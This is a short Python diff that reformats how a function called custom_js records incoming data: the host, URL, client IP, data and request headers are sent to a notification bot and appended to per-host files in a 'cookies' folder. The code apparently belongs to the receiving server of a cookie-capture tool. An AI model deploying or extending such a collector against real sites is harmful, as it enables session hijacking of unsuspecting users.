@@ -33,19 +33,19 @@ async def custom_js(data, ip: str, header: str, host, url=''):
         delport = len(hostname)
     hostname = hostname[:delport]
     if ding:
-        bot(get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+        bot(get_time + '\n' + 'HOST：' + host + (url if url == '' else f"\n请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
 
     header = header.replace("\n", "")
 
     if os.path.isdir(f"{os.getcwd()}/cookies"):
         with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
             f.write(
-                get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+                get_time + '\n' + 'HOST：' + host + (url if url == '' else f"\n请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
     else:
         os.mkdir(f"{os.getcwd()}/cookies")
         with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
             f.write(
-                get_time + '\n' + 'HOST：' + host + '\n' + (url if url == '' else f"请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
+                get_time + '\n' + 'HOST：' + host + (url if url == '' else f"\n请求url：{url}") + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
 
     if clear:
         if not ding:
